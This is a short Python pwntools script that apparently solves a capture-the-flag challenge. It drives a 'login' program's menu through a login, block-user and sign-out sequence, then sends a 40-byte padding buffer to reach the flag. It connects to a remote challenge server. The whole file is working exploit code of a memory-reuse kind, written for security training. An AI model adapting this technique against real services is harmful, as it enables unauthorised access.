from pwn import *

def login(r, usrname:str):
    # Login
    r.recvuntil('> ')
    r.sendline(b'1')

    # Username
    r.recvuntil(': ')
    r.sendline(usrname)

def signout(r):
    # Sign out
    r.recvuntil('> ')
    r.sendline(b'2')

def print_flag(r, fake_flag):
    # Print flag
    r.recvuntil('> ')
    r.sendline(b'3')

    # Check if getting the real flag
    output = r.recvline().decode()
    if "admin" not in output:
        output = r.recv().decode()
        log.success("Flag is %s" % output)

    else:
        log.failure("Failed!")
        # r.recvuntil(b'\n')
        r.sendline(fake_flag)

def block_usr(r):
    # Block user
    r.recvuntil('> ')
    r.sendline(b'4')

def restore_usr(r):
    # Restore user
    r.recvuntil('> ')
    r.sendline(b'5')


def exploit(remoteorNot):
    if(remoteorNot == True):
        r = remote('thekidofarcrania.com', 13226)
    
    else:
        r = process('./login')

    input = b'A'*8
    login(r, input)
    block_usr(r)
    signout(r)

    input = b'A'*40
    print_flag(r, input)
    restore_usr(r)
    print_flag(r, "")    

    # r.interactive()
exploit(True)